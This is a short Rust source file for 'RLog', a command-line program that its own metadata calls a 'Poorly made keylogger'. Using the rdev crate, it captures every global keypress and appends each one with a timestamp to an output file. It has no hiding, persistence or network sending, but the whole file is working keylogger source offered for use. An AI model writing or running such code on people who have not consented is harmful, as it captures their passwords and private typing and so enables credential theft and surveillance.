use rdev::{listen, Event};
use std::path::Path;
use std::io::Write;
use std::fs::File;
use chrono;
use clap::{App, Arg};

fn main() {
    // parse args
    let app = App::new("RLog")
        .version("1.0")
        .about("Poorly made keylogger written in Rust")
        .author("TabulateJarl8");

    let outfile_option = Arg::new("outfile")
        .long("outfile")
        .short('o')
        .takes_value(true)
        .help("Output file")
        .required(true);

    let app = app.arg(outfile_option);

    let matches = app.get_matches();

    // test outfile
    let filename = matches.value_of("outfile").expect("outfile can't be None");

    if Path::new(&filename).exists() {
        let mut proceed = String::new();
        print!("File \"{}\" exists. Proceed? [y/N] ", filename);
        std::io::stdout().flush().expect("Failed to flush stdout");
        std::io::stdin().read_line(&mut proceed).unwrap();
        if proceed.to_lowercase().trim() != "y" {
            println!("Exiting...");
            std::process::exit(0);
        }
    }

    File::create(&filename).expect(format!("Failed to create file {}", filename).as_str());

    let file = std::fs::OpenOptions::new()
        .append(true)
        .open(&filename)
        .unwrap();

    let callback_partial = move |arg0| callback(arg0, file.try_clone().unwrap());

    if let Err(error) = listen(callback_partial) {
        println!("Error: {:?}", error)
    }
}

fn callback(event: Event, mut file: File) {
    match event.name {
        Some(mut string) => {
            string = string.replace("\r", "\\r");
            let formatted_string = format!("{} | Keypress: {}\n", chrono::offset::Utc::now(), string);
            match file.write_all(formatted_string.as_bytes()) {
                Err(error) => panic!("Error writing the file: {:?}", error),
                _ => ()
            };
        },
        None => (),
    }
}
